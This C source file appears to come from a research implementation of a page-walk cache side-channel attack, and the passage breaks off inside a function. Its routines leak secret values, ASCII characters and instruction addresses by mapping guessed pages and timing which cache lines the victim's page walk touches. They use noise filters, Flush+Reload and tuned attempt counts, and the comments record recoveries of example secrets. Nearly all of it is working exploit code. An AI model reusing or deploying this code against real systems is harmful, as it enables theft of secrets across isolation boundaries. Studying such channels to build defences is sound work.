#include "leak.h"
#include "pwsc.h"
#include "util.h"
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

/* Suppress the PL2 cache lines covered by the attacker's OWN mapped image.
 *
 * The attacker executes continuously during the measurement window, so it walks
 * its own page tables constantly, and those walks land in the same PD page the
 * secret's walk uses. With .text at 0x1400000 the image sits at PD[10] -> line
 * (10>>3) = 1, and the 16.9 MB eviction buffer spills into line 2. Measured at
 * co=0, 7 attempts, 120 trials: line 1 summed 1080 and line 18 (the true PL2
 * line) summed 1080 -- an exact tie -- while the highest genuinely-random line
 * reached only 453. So the real signal cleared the noise floor by 627, more than
 * twice the gap threshold, and was blocked solely by this self-inflicted alias.
 *
 * More attempts cannot fix that. This artifact is structural, not random: it
 * accumulates linearly in attempts exactly as the signal does (measured cv 0.37
 * against >1.3 for the genuinely noisy lines), so the sqrt(n) argument that
 * suppresses lines 37/48/40 does not apply to it.
 *
 * This uses NO knowledge of the secret. The attacker is reading the location of
 * its own binary out of its own /proc/self/maps -- information it trivially has.
 * Restricted to [0, 1 GiB) because that is the region reachable through the
 * PDPT entry the walk traverses (vpn4 and vpn3 are both 0 for a 32-bit value),
 * which keeps the mask to a handful of lines instead of aliasing every library
 * and stack mapping in the address space.
 *
 * Must be called BEFORE the co loops below take their own mappings, so that the
 * probe pages they reserve are not themselves masked out. */
#define SELF_IMAGE_SUPPRESS 32 /* per-round units; ~200x line 1's amplitude */

/* Marks the PL2 cache lines the attacker's own image occupies and suppresses
   them in init_noise_filter. `marked_out` receives the 64-entry mark array so
   the caller can undo it -- see unfilter_self_image_lines below.

   ONLY VALID FOR LOOP 1 (the PL2 search). The line index computed here is
   (va >> 24) & 0x3f, which is vpn2_set. Loop 2 searches the PL1 level, where
   the line index is (va >> 15) & 0x3f = vpn1_set -- a different namespace, in
   which these same integers mean something else entirely. */
static void filter_self_image_lines(uint64_t *init_noise_filter,
                                    int *marked_out) {
  for (int i = 0; i < 64; i++)
    marked_out[i] = 0;

  FILE *f = fopen("/proc/self/maps", "r");
  if (!f) {
    fprintf(stderr, "filter_self_image_lines: cannot open /proc/self/maps: %s "
                    "(continuing unfiltered)\n",
            strerror(errno));
    return;
  }
  int *marked = marked_out;
  char line[512];
  while (fgets(line, sizeof line, f)) {
    unsigned long start, end;
    if (sscanf(line, "%lx-%lx", &start, &end) != 2)
      continue;
    if (start >= 0x40000000UL) /* outside the walked PDPT entry */
      continue;
    if (end > 0x40000000UL)
      end = 0x40000000UL;
    /* One PL2 cache line covers 8 PD entries x 2 MiB = 16 MiB of VA. */
    for (unsigned long va = start & ~0xFFFFFFUL; va < end; va += 0x1000000UL)
      marked[(va >> 24) & 0x3f] = 1;
  }
  fclose(f);

  fprintf(stderr, "filter_self_image_lines: suppressing attacker's own PL2 "
                  "lines:");
  for (int i = 0; i < 64 && i < ncache_lines; i++)
    if (marked[i]) {
      init_noise_filter[i] += SELF_IMAGE_SUPPRESS;
      fprintf(stderr, " %d", i);
    }
  fprintf(stderr, "\n");
}

/* Removes the loop-1 mask before the PL1 search.

   Necessary because the mark is level-specific: line N at PL2 covers
   8 PD entries x 2 MiB = 16 MiB, but line N at PL1 covers 8 PT entries x 4 KiB
   = 32 KiB, so the 64 PL1 lines span only 2 MiB in total. The attacker's image
   (~33 MB) wraps that range many times over and touches every one of them --
   a PL1-correct self-image filter would mask all 64 lines and find nothing.
   So loop 2 runs unfiltered, which is how it behaved before the mask existed,
   and it is the configuration in which it successfully found line 40.

   Leaving the mask in place silently breaks any secret whose vpn1_set lands on
   a marked line. Measured on this build the marks are {0, 1, 2}, so ~3 of every
   64 secrets (4.7%) were undecodable for a reason having nothing to do with the
   channel. 0x12345678 has vpn1_set=40 and so never exposed this. */
static void unfilter_self_image_lines(uint64_t *init_noise_filter,
                                      const int *marked) {
  fprintf(stderr, "unfilter_self_image_lines: releasing PL2 mask before the "
                  "PL1 search:");
  for (int i = 0; i < 64 && i < ncache_lines; i++)
    if (marked[i]) {
      init_noise_filter[i] -= SELF_IMAGE_SUPPRESS;
      fprintf(stderr, " %d", i);
    }
  fprintf(stderr, "\n");
}

/* Dumps every /proc/self/maps line whose range touches [lo, hi). The co loops
   below reserve a page inside the 2 MiB region they are probing; if that
   reservation silently fails the page walk still aborts at PL2 and the level
   below stays invisible, which looks exactly like "no signal" in the timings.
   Printing the surrounding mappings is what tells those two cases apart. */
static void dump_maps_range(uint64_t lo, uint64_t hi) {
  FILE *f = fopen("/proc/self/maps", "r");
  if (!f) {
    fprintf(stderr, "  maps: cannot open /proc/self/maps: %s\n",
            strerror(errno));
    return;
  }
  char line[512];
  int printed = 0;
  while (fgets(line, sizeof line, f)) {
    unsigned long start, end;
    if (sscanf(line, "%lx-%lx", &start, &end) != 2)
      continue;
    if (start < hi && end > lo) {
      fprintf(stderr, "  maps: %s", line);
      printed = 1;
    }
  }
  if (!printed)
    fprintf(stderr, "  maps: nothing mapped in [%lx, %lx)\n", lo, hi);
  fclose(f);
}

// This retrives the non-cached VPN or PO in the target page walk
uint64_t leak_pwsc_non_cached(uint64_t addr, uint64_t *init_noise_filter) {
  // Set up run_pwsc
  reset_noise_filter();
  if (init_noise_filter != NULL)
    for (int i = 0; i < ncache_lines; i++)
      noise_filter[i] = init_noise_filter[i];

  // Call run_pwsc
  return get_non_buffered_value(addr);
}

// Just runs the PWSC channel with whatever configurations have been set
struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
  // Set up run_pwsc
  reset_noise_filter();
  if (init_noise_filter != NULL)
    for (int i = 0; i < ncache_lines; i++)
      noise_filter[i] = init_noise_filter[i];

  // Call run_pwsc
  return run_pwsc(addr);
}

/* The two loops want different budgets, because they are no longer solving the
   same kind of problem.

   Loop 1 (PL2) still decides in C, using filter_self_image_lines plus the
   solver's gap rule, and it is an easy decision: on the 0x45678213 run the true
   line 5 was rank 1 in 9/9 attempts at 11262 against a runner-up of 343, a 33x
   margin. Three attempts is ample and it is the cheap way to buy the loop-2
   budget below.

   Loop 2 (PL1) no longer decides anything in C -- it sweeps all 8 co and the
   raw dump is scored afterwards by spike.py. Its job is purely to collect, and
   9 is what makes the collection worth scoring: signal accumulates linearly in
   attempts while the noise peak only grows as sqrt, and measured per-attempt
   PL1 amplitudes vary far more than within-attempt sampling predicts (+1.67,
   +1.13, +0.72, +1.51 per trial across four independent samples), so
   between-attempt variance dominates and sqrt(n)-in-trials projections come out
   over-optimistic.

   Do not collapse these back into one number. The 0x12345678 recovery needed 9
   at PL1 and failed at 3; spending 9 at PL2 as well triples the cheap half of
   the run for a decision that was never close. */
#define PWSC_ATTEMPTS_L1_DEFAULT 3
#define PWSC_ATTEMPTS_L2_DEFAULT 9

/* PWSC_ATTEMPTS_L1 / PWSC_ATTEMPTS_L2 override one level each; PWSC_ATTEMPTS
   overrides both, and is kept because older scripts and the run logs already in
   results.out set it. A per-level variable wins over the global one. */
static uint64_t attempts_env(const char *name, uint64_t dflt) {
  const char *s = getenv(name);
  if (s && *s) {
    unsigned long v = strtoul(s, NULL, 10);
    if (v >= 1 && v <= 64)
      return (uint64_t)v;
    fprintf(stderr, "%s=%s out of range [1,64], ignoring\n", name, s);
  }
  return dflt;
}

/* Generic bounded integer knob, same shape as attempts_env above. Used only by
   the diagnostic overrides in leak_inst_addr_ind. */
static long int_env(const char *name, long dflt, long lo, long hi) {
  const char *s = getenv(name);
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= lo && v <= hi)
      return v;
    fprintf(stderr, "%s=%s out of range [%ld,%ld], ignoring\n", name, s, lo, hi);
  }
  return dflt;
}

static uint64_t pwsc_attempts_l1(void) {
  return attempts_env("PWSC_ATTEMPTS_L1",
                      attempts_env("PWSC_ATTEMPTS", PWSC_ATTEMPTS_L1_DEFAULT));
}

static uint64_t pwsc_attempts_l2(void) {
  return attempts_env("PWSC_ATTEMPTS_L2",
                      attempts_env("PWSC_ATTEMPTS", PWSC_ATTEMPTS_L2_DEFAULT));
}

uint64_t leak_level0_line_n(uint64_t addr, uint64_t *init_noise_filter,
                            uint64_t attempts) {
  reset_noise_filter();
  if (init_noise_filter != NULL)
    for (int i = 0; i < ncache_lines; i++)
      noise_filter[i] = init_noise_filter[i];

  fprintf(stderr, "leak_level0_line: %lu attempts\n", attempts);
  return find_level0_line(addr, attempts);
}

uint64_t leak_level0_line(uint64_t addr, uint64_t *init_noise_filter) {
  return leak_level0_line_n(addr, init_noise_filter, pwsc_attempts_l2());
}

void flush_and_reload_final_bits(struct pwsc_ans *ans,
                                 setup_page_walk_trigger_t setup,
                                 trigger_page_walk_t trigger, uint64_t addr) {
  int *indexes = generate_indexes(64);
  hit_count hits[64];
  hit_count noise_hits[64];
  uint64_t trash = 0;

  for (int i = 0; i < 64; ++i) {
    hits[i].hits = 0;
    hits[i].index = i;
    noise_hits[i].hits = 0;
    noise_hits[i].index = i;
  }

  fprintf(stderr, "Trying to map %lx\n", ans->va.va);

  char *va_buffer = mmap(
      (void *)ans->va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);

  if (va_buffer == MAP_FAILED) {
    fprintf(stderr, "mmap Failed\n");
    ans->va.po_set = 0;
    return;
    // exit(1);
  }
  memset(va_buffer, 0xC3, 4096);

  for (int round = 0; round < 2048; ++round) {

    /* Noise measurement (phase=0): hits here are discounted from signal */
    setup(addr, 0, trash);
    _mm_mfence();
    _mm_lfence();

    for (int i = 0; i < 4096; i += 64) {
      clflush((uint64_t *)(va_buffer + i), trash);
    }

    _mm_mfence();
    _mm_lfence();

    trigger(addr, 0, trash);

    _mm_mfence();
    _mm_lfence();

    for (int i = 0; i < 64; ++i) {
      int index = indexes[i];
      size_t offset = index * 64;
      trash = 0;
      uint64_t *p = (uint64_t *)(va_buffer + offset);
      uint64_t time = time_access_inst(p, trash);
      trash = (trash | time) & (MSB_MASK - 1);
      if (time < 150) {
        noise_hits[index].hits++;
      }
    }
    _mm_mfence();
    _mm_lfence();

    /* Signal measurement (phase=1) */
    setup(addr, 1, trash);
    _mm_mfence();
    _mm_lfence();

    for (int i = 0; i < 4096; i += 64) {
      clflush((uint64_t *)(va_buffer + i), trash);
    }

    _mm_mfence();
    _mm_lfence();

    trigger(addr, 1, trash);

    _mm_mfence();
    _mm_lfence();

    for (int i = 0; i < 64; ++i) {
      int index = indexes[i];
      size_t offset = index * 64;
      trash = 0;
      uint64_t *p = (uint64_t *)(va_buffer + offset);
      uint64_t time = time_access_inst(p, trash);
      trash = (trash | time) & (MSB_MASK - 1);
      if (time < 150) {
        hits[index].hits++;
      }
    }
    _mm_mfence();
    _mm_lfence();
  }

  /* Subtract noise hits from signal hits */
  for (int i = 0; i < 64; ++i) {
    if (hits[i].hits > noise_hits[i].hits)
      hits[i].hits -= noise_hits[i].hits;
    else
      hits[i].hits = 0;
  }

  qsort(hits, 64, sizeof(hit_count), sort_descending);

  if (hits[0].hits < 500) {
    fprintf(stderr, "Low confidence in the final cache line loaded\n");
  }
  fprintf(stdout, "The index is %lu\n", hits[0].index);
  ans->va.po_set = hits[0].index;
  ans->va.po_co = 0;
  for (int i = 0; i < ncache_lines; ++i) {
    fprintf(stderr, "Index - %lu Hits - %lu\n", hits[i].index, hits[i].hits);
  }
  fprintf(stderr, "The answer is %lx\n", ans->va.va);

  munmap(va_buffer, 4096);
}

/*
 *  leak_ascii_char -  Optimized function for ASCII characters: we only need a
 * page walk depth up to VPN4 (depth 1) Inputs:     Address under target,
 * initial noise filter config, expected VPN4 value Outputs:    pwsc_ans with a
 * complete VPN4 value and VPN3 cache set value. This allows the caller to
 * reconstruct one ASCII character Assumptions: `expected_vpn4_set` is set to
 * `ncache_lines` if there is not an expected value
 */
struct pwsc_ans leak_ascii_char(uint64_t addr, uint64_t *init_noise_filter,
                                uint64_t expected_vpn4_set) {

  // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii
  // character)
  fprintf(stdout, "Trying to leak the address %lx\n", addr);
  struct pwsc_ans init_pwsc_ans;
  init_pwsc_ans.va.va = 0;
  init_pwsc_ans.num_lines_found = 0;
  uint64_t initial_line = leak_pwsc_non_cached(addr, init_noise_filter);
  fprintf(stdout, "The inital line is %lu\n", initial_line);
  if (initial_line != ncache_lines) {
    init_pwsc_ans.va.vpn4_set = initial_line;
    init_pwsc_ans.num_lines_found = 1;

    if (expected_vpn4_set != ncache_lines && initial_line != expected_vpn4_set)
      fprintf(stderr, "[WARNING] previous line does not match this line\n");
  } else {
    init_pwsc_ans.va.vpn4_set = expected_vpn4_set;
    init_pwsc_ans.num_lines_found = 0;
  }

  // Determine the VPN4 CO bits (since it is an ascii character we only need to
  // leak 2 more bits)
  for (uint8_t co_guess = 0; co_guess < 4; co_guess++) {

    // Map our guess
    struct pwsc_ans guess = init_pwsc_ans;
    guess.va.vpn4_co = co_guess << 1; // The least significant bit of the CO is
                                      // always 0 (since ASCII secret here)
    char *va_buffer =
        mmap((void *)guess.va.va, 4096, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
             -1, 0);
    if (va_buffer == (void *)-1) {
      fprintf(stderr, "[ERROR] mmap in leak_ascii_char failed :(\n");
      return init_pwsc_ans;
    }
    *va_buffer = 0x5A;
    fprintf(stderr, "We are verifying the guess %lx\n", guess.va.va);

    // Check if our guess is correct
    // ****Please note! that if the vpn4 set and vpn3 set are equal this will
    // not be able to find a value. This allows for faster performance and
    // simplier code but can lead to a small drop in accuracy. In the future it
    // might be worthwhile to upgrade this to avoid this issue.
    uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter);
    munmap((void *)guess.va.va, 4096);
    if ((found_line != ncache_lines) &&
        found_line != init_pwsc_ans.va.vpn4_set) {
      guess.va.vpn3_set = found_line;
      return guess;
    }
  }

  fprintf(stderr, "[WARNING] Unable to find cache offset :(!\n");
  return init_pwsc_ans;
}

struct pwsc_ans leak_inst_addr_ind(uint64_t addr, uint64_t *init_noise_filter,
                                   uint64_t already_found,
                                   setup_page_walk_trigger_t setup,
                                   trigger_page_walk_t trigger) {

  struct pwsc_ans ret;
  ret.va.va = 0;
  ret.num_lines_found = 0;

  ret.va.vpn4_set = 0; // For a 32 bit value range VPN4 Set and CO are always 0
  ret.va.vpn4_co = 0;

  ret.va.vpn3_set = 0; // For a 32 bit value range VPN3 Set is always 0
  ret.num_lines_found = 1;

  /* Mask the attacker's own image before any probing, and before the co loops
     below map their own pages. Released again before loop 2 -- the mask is
     computed in the PL2 line namespace and is meaningless at PL1. */
  int self_image_marks[64];
  filter_self_image_lines(init_noise_filter, self_image_marks);

  uint64_t line;

  /* DIAGNOSTIC ONLY. PWSC_FORCE_PL2=<0..63> asserts the PL2 line instead of
     measuring it, which skips loop 1 entirely (it is guarded on
     num_lines_found == 1, and this bumps the count). It reinstates exactly the
     hardcoding the comment below warns about, behind an env var, so that a PL1
     experiment does not have to spend 3 profile_cache calls -- over 3 hours at
     sleep_ns=24ms -- re-deriving a line already known from a previous run.

     It also does loop 1's init_noise_filter[line] += 2. That is not optional:
     without it the PL2 line stays unfiltered into loop 2, where it reads ~1300
     per attempt and outranks everything at every co.

     With this set, vpn3_co and vpn2_set are NOT measured -- the decode is only
     as trustworthy as the number passed in. Never use it for a real run. */
  {
    long forced = int_env("PWSC_FORCE_PL2", -1, 0, ncache_lines - 1);
    if (forced >= 0) {
      ret.va.vpn2_set = (uint64_t)forced;
      init_noise_filter[forced] += 2;
      ret.num_lines_found++;
      /* Loop 1 measures vpn3_co as well as the line, and loop 2 builds its
         probe address from BOTH (va = vpn3_co<<30 | vpn2_set<<24 | ...).
         Skipping loop 1 leaves vpn3_co at the ret.va.va = 0 default, which
         silently probes the wrong 1 GiB region -- the PL1 line is then absent
         for a reason that has nothing to do with the experiment. Assert it
         too, from the same previous run the PL2 line came from. */
      long fco = int_env("PWSC_FORCE_VPN3_CO", -1, 0, 7);
      if (fco >= 0)
        ret.va.vpn3_co = (uint64_t)fco;
      fprintf(stderr,
              "PWSC_FORCE_PL2=%ld: skipping loop 1, asserting PL2 line L%ld, "
              "vpn3_co=%d (NOT measured)\n",
              forced, forced, (int)ret.va.vpn3_co);
      if (fco < 0)
        fprintf(stderr,
                "PWSC_FORCE_PL2 WARNING: PWSC_FORCE_VPN3_CO unset, using "
                "vpn3_co=0. If the secret's vpn3_co is not 0, loop 2 will "
                "probe the wrong 1 GiB region and find nothing.\n");
    }
  }

  /* Loop 1: MEASURE the PL2 line instead of asserting it. This copy previously
     did `vpn2_set = 18; num_lines_found = 2; init_noise_filter[18] += 2;`,
     which both hardcoded the correct answer for 0x12345678 and skipped this
     loop entirely -- so of the three components of the decoded address only
     vpn1_set was ever measured. Loop 1 now finds the PL2 line itself and does
     its own init_noise_filter[line] += 2 on whatever it finds. */
  if (ret.num_lines_found == 1) {

    /* DIAGNOSTIC ONLY. PWSC_LOOP1_CO_START / PWSC_LOOP1_CO_COUNT narrow this
       sweep, mirroring the loop-2 knobs below. Defaults 0 and 4 reproduce the
       full sweep. Narrowing exists so a secret whose vpn3_co is 3 can be probed
       without paying for co=0..2 first (~1 h each); like the loop-2 version it
       can only answer "is the line present at this co", never decode, and it
       still breaks on the first accept. The sweep wraps. */
    int l1_co_start = (int)int_env("PWSC_LOOP1_CO_START", 0, 0, 3);
    int l1_co_count = (int)int_env("PWSC_LOOP1_CO_COUNT", 4, 1, 4);
    if (l1_co_start != 0 || l1_co_count != 4)
      fprintf(stderr,
              "loop 1: DIAGNOSTIC sweep of %d co starting at co=%d -- %s\n",
              l1_co_count, l1_co_start,
              l1_co_count < 4 ? "NOT a full sweep, decode is not valid"
                              : "full sweep, reordered");

    for (int ci = 0; ci < l1_co_count; ci++) {
      int co = (l1_co_start + ci) % 4;
      ret.va.vpn3_co = co;
      fprintf(stderr, "The address mapped is %lx\n", ret.va.va);

      if (co > 0) {
        char *va_buffer = mmap(
            (void *)ret.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
            -1, 0);

        if (va_buffer == MAP_FAILED) {
          fprintf(stderr, "Failed to mmap address %lx: %s\n", ret.va.va,
                  strerror(errno));
          dump_maps_range(ret.va.va & ~0x1FFFFFUL,
                          (ret.va.va & ~0x1FFFFFUL) + 0x200000UL);
          exit(1);
        }

        fprintf(stderr, "  mmap(%lx) -> %p\n", ret.va.va, (void *)va_buffer);

        *va_buffer = 0x5A;
      }

      line = leak_level0_line_n(addr, init_noise_filter, pwsc_attempts_l1());

      if (line != 64) {
        ret.va.vpn2_set = line;
        init_noise_filter[line] += 2;
        ret.num_lines_found++;

        if (co > 0) {
          munmap((void *)ret.va.va, 0x1000);
        }
        break;
      }

      if (co > 0) {
        munmap((void *)ret.va.va, 0x1000);
      }
    }
  }

  if (ret.num_lines_found != 2) {
    fprintf(stderr, "Error: unable to find address\n");
    return ret;
  }

  /* The PL2 search is done; its mask must not leak into the PL1 search below,
     where the same integers index a different level. */
  unfilter_self_image_lines(init_noise_filter, self_image_marks);

  /* Scan from co=0, not co=1. Starting at 1 made co=0 unreachable, and co=1 is
     the correct answer for 0x12345678 -- so the first candidate tried was the
     right one, which is not a search.

     NO EARLY EXIT. Every co is measured even after one of them accepts. The
     acceptance rule itself is unchanged -- the FIRST accepting co still wins,
     so the decode this function returns is exactly what it was -- but the
     remaining co are still measured so PWSC_RAW_DUMP captures all eight.

     That full sweep is what the between-co contrast needs. Within-co ranking
     provably cannot find the PL1 line: on run_45678213 the true line 15 scored
     201 at the correct co while the co-independent artifact line 0 scored 1538
     there and 1554/1450/1160 at the wrong co. No threshold separates those.
     Across co, line 15 reads -54/-40/-29/+201 while line 0 stays flat, so the
     discriminator is co-DEPENDENCE, and computing it requires every co --
     including the ones after an accept.

     Cost: loop 2 no longer short-circuits, so it always runs 8 co instead of
     stopping at the first hit. */
  int first_line = 64;  /* line accepted by the earliest co, 64 = none yet */
  int first_co = -1;
  int co_line[8];
  for (int i = 0; i < 8; i++)
    co_line[i] = 64;    /* a narrowed sweep leaves the unvisited co unset */

  /* DIAGNOSTIC ONLY. PWSC_LOOP2_CO_START / PWSC_LOOP2_CO_COUNT narrow the
     sweep; the defaults 0 and 8 reproduce the full sweep the comment above
     argues for. Narrowing forfeits the between-co contrast that spike.py's
     rule 2 needs -- with a single co there is nothing to contrast against --
     so this can only answer "is the line present at all", never decode.
     The sweep wraps, so START=1 COUNT=8 is still a full sweep, reordered to
     put the co of interest first. */
  int co_start = (int)int_env("PWSC_LOOP2_CO_START", 0, 0, 7);
  int co_count = (int)int_env("PWSC_LOOP2_CO_COUNT", 8, 1, 8);
  if (co_start != 0 || co_count != 8)
    fprintf(stderr,
            "loop 2: DIAGNOSTIC sweep of %d co starting at co=%d -- %s\n",
            co_count, co_start,
            co_count < 8 ? "NOT a full sweep, spike.py cannot score this"
                         : "full sweep, reordered");

  for (int i = 0; i < co_count; i++) {
    int co = (co_start + i) % 8;
    ret.va.vpn2_co = co;
    fprintf(stderr, "The address mapped is %lx\n", ret.va.va);

    char *va_buffer =
        mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
             -1, 0);

    if (va_buffer == MAP_FAILED) {
      fprintf(stderr, "Error: Unable to mmap %lx: %s\n", ret.va.va,
              strerror(errno));
      dump_maps_range(ret.va.va, ret.va.va + 0x200000UL);
      exit(1);
    }

    /* The reservation is what makes PDE[va >> 21] present, and therefore what
       lets the walk for `addr` descend from PL2 to PL1. Confirm it landed
       before spending a full leak_level0_line on the measurement. */
    fprintf(stderr, "  mmap(%lx) -> %p\n", ret.va.va, (void *)va_buffer);
    dump_maps_range(ret.va.va, ret.va.va + 0x200000UL);

    line = leak_level0_line_n(addr, init_noise_filter, pwsc_attempts_l2());

    munmap((void *)ret.va.va, 0x1000);

    co_line[co] = (int)line;

    if (line != 64 && first_co < 0) {
      first_line = (int)line;
      first_co = co;
      // init_noise_filter[line] += 2; // We don't want to filter this out
      // because we check if we fetched this later
    }
  }

  fprintf(stderr, "loop2 full co sweep:");
  for (int co = 0; co < 8; co++)
    if (co_line[co] == 64)
      fprintf(stderr, " co%d=-", co);
    else
      fprintf(stderr, " co%d=L%d", co, co_line[co]);
  fprintf(stderr, "\n");

  /* ADVISORY ONLY. The PL1 decision has moved out of this process: loop 2's job
     is now to sweep all 8 co and leave the raw dump behind, and spike.py scores
     it with rules the solver cannot express (subtract the loop-1 co=0 null
     control, then keep only lines that fire at exactly ONE co).

     "First accepting co" is kept because it costs nothing and disagreement
     between it and spike.py is worth seeing, but it is known to be wrong: on
     run_45678213_v2 the sweep read `co0=L0 co1=L0 co2=L0 co3=L15 co4=L0 ...`
     and this rule took co=0/L0 -- the co-independent self-noise artifact, 8159
     of which is present even at the null control where nothing is mapped --
     while the true answer, L15 at co=3, was sitting in the sweep line.

     So do NOT abort when nothing is accepted. An empty sweep still produces a
     dump that spike.py can score, and aborting here would throw away the 8 co
     of measurement that the run just spent an hour collecting. */
  if (first_co >= 0) {
    ret.va.vpn2_co = first_co;
    ret.va.vpn1_set = first_line;
    ret.num_lines_found++;
    fprintf(stderr,
            "loop2 accepted co=%d line=L%d (first accepting co; ADVISORY -- "
            "spike.py decides)\n",
            first_co, first_line);
  } else {
    fprintf(stderr, "loop2 accepted nothing (ADVISORY -- spike.py decides "
                    "from the raw dump)\n");
  }

  if (ret.num_lines_found != 3)
    fprintf(stderr, "[WARN] loop 2 produced no in-process PL1 candidate; the "
                    "bits below are incomplete and only the raw dump is "
                    "authoritative\n");

  /* Works until here */

#if 0
  for (int co = 0; co < 8; co++) {
    ret.va.vpn1_co = co;
    ret.va.po_set = 0;
    init_noise_filter[18] += 2;

    char *va_buffer =
        mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
             -1, 0);

    if (!va_buffer) {
      fprintf(stderr, "Failed to mmap address\n");
      exit(1);
    }

    *va_buffer = 0x5A;

    // flush_and_reload_final_bits(&ret, setup, trigger, addr);

    fprintf(stderr, "Checking co %d\n", co);
    line = leak_level0_line(addr, init_noise_filter);

    // munmap((void *)ret.va.va, 0x1000);

    // if (line != 64 && line == ret.va.vpn1_set) {
    // ret.num_lines_found++;
    // break;
    //}
  }

  if (ret.num_lines_found != 4) {
    fprintf(stderr, "Error: unable to find address\n");
    ret.va.vpn1_co = 0;
    return ret;
  }
#endif

  fprintf(stderr, "The bits decoded are %lx\n", ret.va.va);

  return ret;
}

struct pwsc_ans leak_inst_addr(uint64_t addr, uint64_t *init_noise_filter,
                               uint64_t expected_vpn4_set,
                               setup_page_walk_trigger_t setup,
                               trigger_page_walk_t trigger) {
  // Leak whatever is mapped (lose the cache offsets here)
  struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);
  uint64_t trash;
  fprintf(stderr,
          "The va found after first pass is %u and the number of lines found "
          "is %lu\n",
          init_profile.va.vpn4_set, init_profile.num_lines_found);
  if (init_profile.va.vpn4_set != expected_vpn4_set)
    fprintf(stderr, "[WARNING] previous line does not match this line\n");
  // You can add more complex handling, for example sometimes things are
  // reordered. I chose to not add more complex handling here and just decide
  // to give up lol. It doesn't seem to have that big of a hit on performance
  // and helps improve speed.

  // Don't attempt to use the mapping order oracle on kernel pointers - Can we
  // mmap kernel pages from userspace? Probably not
  if (init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1)
    return init_profile;

  // If we found multiple cache sets (lines) then we either don't know the
  // cache offsets. Then we should return all zeros to not claim to know
  // anything
  if (init_profile.num_lines_found > 1) {
    fprintf(stderr, "Too noisy! Please try again\n");
    init_profile.va.va = 0;
    return init_profile;
  }

  // Memory mapping order oracle
  struct pwsc_ans ret = init_profile;
  uint64_t previous_set = ret.va.vpn4_set;
  uint64_t found_line;

  // If we don't see any lines in our initial search then it is likely that
  // the address is a low address with higher VPN values all being 0. So, we
  // assume VPN4 to be 0 and go from there.

  if (previous_set == 0) {
    fprintf(stderr, "[WARNING] Unable to determine CO and VPN4 cache set, "
                    "assuming to be 0\n");
    ret.va.vpn4_set = 0;
    ret.va.vpn4_co = 0;
    ret.num_lines_found = 1;
    previous_set = 64;
  }

  for (int cur_depth = ret.num_lines_found; cur_depth <= 4; cur_depth++) {
    for (uint8_t co_guess = 0; co_guess < 8; co_guess++) {

      // Fill in guess for the level we are working with
      if (cur_depth == 1)
        ret.va.vpn4_co = co_guess;
      else if (cur_depth == 2)
        ret.va.vpn3_co = co_guess;
      else if (cur_depth == 3)
        ret.va.vpn2_co = co_guess;
      else if (cur_depth == 4)
        ret.va.vpn1_co = co_guess;

      // Avoid making the memory mapped region result in the next vpn set to
      // be 0 which we have trouble handling
      if (cur_depth <= 1) {
        ret.va.vpn3_set = 1;
        ret.va.vpn3_co = 6;
      }
      if (cur_depth <= 2) {
        ret.va.vpn2_set = 5;
        ret.va.vpn2_co = 6;
      }
      if (cur_depth <= 3) {
        ret.va.vpn1_set = 1;
        ret.va.vpn1_co = 6;
      }

      fprintf(stderr, "We are verifying the guess %lx\n", ret.va.va);

      // Map the guess
      char *va_buffer =
          mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
               MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
               -1, 0);
      if (va_buffer == (void *)-1) {
        fprintf(stderr,
                "[ERROR] mmap in leak_inst_addr failed :(!\n We tried to map "
                "the address %lx",
                ret.va.va);
        found_line = ncache_lines;
        goto check_line;
      }
      *va_buffer = 0x5A;

      // Check if guess is right
      found_line = leak_pwsc_non_cached(addr, init_noise_filter);
      fprintf(stderr, "Found line is %lu\n", found_line);
      fprintf(stderr, "Previous set is %lu\n", previous_set);

      munmap((void *)va_buffer, 4096);

    check_line:

      // If found line is not ncache_lines and different from previous_set
      // mark it as the set for next level
      if (found_line != previous_set) {
        if (cur_depth == 1)
          ret.va.vpn3_set = found_line;
        else if (cur_depth == 2)
          ret.va.vpn2_set = found_line;
        else if (cur_depth == 3)
          ret.va.vpn1_set = found_line;
        else if (cur_depth == 4)
          ret.va.po_set = found_line;
        ret.num_lines_found++;

        // update previous_set
        previous_set = found_line;
        break;
      } else if (found_line == ncache_lines) {
        // If the found line was not as previous_set, then the address we are
        // looking for has not been mapped yet or it is 0. If it has not been
        // mapped yet, we will find a line which is not ncache_line later, if
        // it is ncache_line, even after 8 iterations we will not see a line
        // that is not ncache_line, and we can assume it to be 0
        previous_set = found_line;
      }
    }

    // We searched all 8 guesses and found nothing
    if (ret.num_lines_found == (uint64_t)cur_depth) {
      fprintf(stderr, "[WARNING] Unable to determine CO and next cache set, "
                      "assuming to be 0\n");
      // We do not have a reason to make the CO also 0, a throrough search
      // goes through all CO values we make it 0 for simplicity. This misses
      // some values
      if (cur_depth == 1) {
        ret.va.vpn4_set = 0;
        ret.va.vpn4_co = 0;
        ret.va.vpn3_set = previous_set;
      }
      if (cur_depth == 2) {
        ret.va.vpn3_set = 0;
        ret.va.vpn3_co = 0;
        ret.va.vpn2_set = previous_set;
      }
      if (cur_depth == 3) {
        ret.va.vpn2_set = 0;
        ret.va.vpn2_co = 0;
        ret.va.vpn1_set = previous_set;
      }
      if (cur_depth == 4) {
        ret.va.vpn1_set = 0;
        ret.va.vpn1_co = 0;
      }
      ret.num_lines_found++;
    }
  }

